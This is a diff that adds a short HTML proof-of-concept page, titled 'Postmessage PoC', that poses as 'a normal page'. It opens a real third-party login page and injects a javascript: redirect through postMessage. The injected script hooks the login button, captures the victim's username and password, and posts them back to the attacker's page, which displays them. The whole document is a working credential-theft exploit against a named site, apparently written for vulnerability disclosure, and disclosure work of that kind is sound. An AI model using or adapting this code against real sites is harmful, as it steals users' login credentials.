@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    <meta charset="UTF-8" />
+    <title>Postmessage PoC</title>
+  
+  </head>
+  <body>
+
+<h1> Hi this is a normal page !</h1>
+    <script>
+      let win = window.open("https://iclass.eccouncil.org/my-account/");
+      let msg = { redirectTo: `javascript: var interv = setInterval(() => {
+        var btn = document.getElementsByClassName("woocommerce-button button woocommerce-form-login__submit")[0];
+        if (btn) {
+          clearInterval(interv);
+          btn.onclick = () => {
+            
+            var userName = document.getElementsByName("username")[0].value;
+            var password = document.getElementsByName("password")[0].value;
+            window.opener.postMessage( "victimUserName="+  encodeURIComponent(userName) +  "&victimPassword=" + encodeURIComponent(password)  ,"*");
+          };
+        }
+      }, 500);` };
+
+      setTimeout(function () {
+        win.postMessage(msg, "*");
+      }, 5000);
+
+
+
+     
+
+
+
+    window.addEventListener("message",function(msg){
+      console.log(msg.data)
+      alert(JSON.stringify(msg.data))
+
+    })
+
+
+    </script>
+  </body>
+</html>
